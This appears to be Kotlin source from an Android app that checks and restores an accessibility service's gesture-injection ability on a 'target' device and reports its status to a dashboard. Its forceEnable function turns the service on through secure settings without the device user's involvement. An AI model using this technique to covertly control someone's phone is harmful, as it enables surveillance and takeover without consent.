package com.sync.xxx

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Log

/**
 * Diagnosa + pemulihan jalur gesture.
 *
 * Dipakai untuk dua hal:
 * 1. Melaporkan ke dashboard apakah aksesibilitas target aktif dan apakah
 *    capability canPerformGestures benar-benar terdaftar (fitur gesture tidak
 *    jalan tanpa flag itu, dan service lama yang belum di-rebind masih
 *    memakai capability versi sebelumnya).
 * 2. Membuka halaman Aksesibilitas di target kalau jalur kontrol putus,
 *    plus percobaan enable langsung di perangkat yang sudah privileged.
 */
object AccessibilityHelper {

    private const val TAG = "A11yHelper"
    private const val COMPONENT_SUFFIX = "AppBlockerService"

    fun isEnabled(ctx: Context): Boolean {
        val enabled = Settings.Secure.getString(
            ctx.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        val pkg = ctx.packageName
        return enabled.split(':').any {
            val flat = it.trim()
            flat.equals("$pkg/.$COMPONENT_SUFFIX", true) || flat.equals("$pkg/$pkg.$COMPONENT_SUFFIX", true)
        }
    }

    /**
     * Capability gesture dibaca langsung dari XML yang dipasang APK.
     * Kalau ini false, tap/swipe tidak akan pernah mendarat — ketahuan lebih
     * awal daripada menunggu dispatchGesture gagal tanpa jejak.
     */
    fun declaredGestureCapability(ctx: Context): Boolean {
        return try {
            val info = ctx.packageManager.getServiceInfo(
                ComponentName(ctx, AppBlockerService::class.java),
                PackageManager.GET_META_DATA
            )
            val resId = info.metaData?.getInt("android.accessibilityservice") ?: return false
            val parser = ctx.resources.getXml(resId)
            var declared = false
            try {
                var event = parser.eventType
                while (event != org.xmlpull.v1.XmlPullParser.END_DOCUMENT) {
                    if (event == org.xmlpull.v1.XmlPullParser.START_TAG) {
                        for (i in 0 until parser.attributeCount) {
                            if (parser.getAttributeName(i) == "canPerformGestures") {
                                declared = parser.getAttributeBooleanValue(i, false)
                            }
                        }
                        break
                    }
                    event = parser.next()
                }
            } finally {
                try { parser.close() } catch (_: Exception) {}
            }
            declared
        } catch (e: Exception) {
            Log.e(TAG, "gagal baca capability: ${e.message}")
            false
        }
    }

    /** Service tersambung DAN capability gesture terdaftar. */
    fun canInject(ctx: Context): Boolean =
        AppBlockerService.instance != null && declaredGestureCapability(ctx)

    /**
     * Tulis ulang daftar service aksesibilitas lewat Settings.Secure.
     * Berhasil hanya kalau proses punya WRITE_SECURE_SETTINGS (device
     * privileged / ADB-granted / root). Selain itu gagal senyap dan pemanggil
     * harus jatuh ke openSettings().
     */
    fun forceEnable(ctx: Context): Boolean {
        return try {
            val pkg = ctx.packageName
            val flat = "$pkg/$pkg.$COMPONENT_SUFFIX"
            val current = Settings.Secure.getString(
                ctx.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            val list = current.split(':').map { it.trim() }.filter { it.isNotEmpty() }.toMutableList()
            if (list.none { it.equals(flat, true) || it.equals("$pkg/.$COMPONENT_SUFFIX", true) }) {
                list.add(flat)
                Settings.Secure.putString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                    list.joinToString(":")
                )
            }
            Settings.Secure.putInt(ctx.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 1)
            true
        } catch (e: Exception) {
            Log.w(TAG, "forceEnable tidak diizinkan: ${e.message}")
            false
        }
    }

    /** Terakhir: buka halaman Aksesibilitas supaya user menyalakan sendiri. */
    fun openSettings(ctx: Context) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            ctx.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "openSettings gagal: ${e.message}")
        }
    }

    /** Deskripsi status untuk dashboard. */
    fun state(ctx: Context): String = when {
        canInject(ctx) -> "ready"
        isEnabled(ctx) && AppBlockerService.instance == null -> "rebind_needed"
        isEnabled(ctx) -> "no_gesture_capability"
        else -> "disabled"
    }

    fun sdkSupported(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.N
}
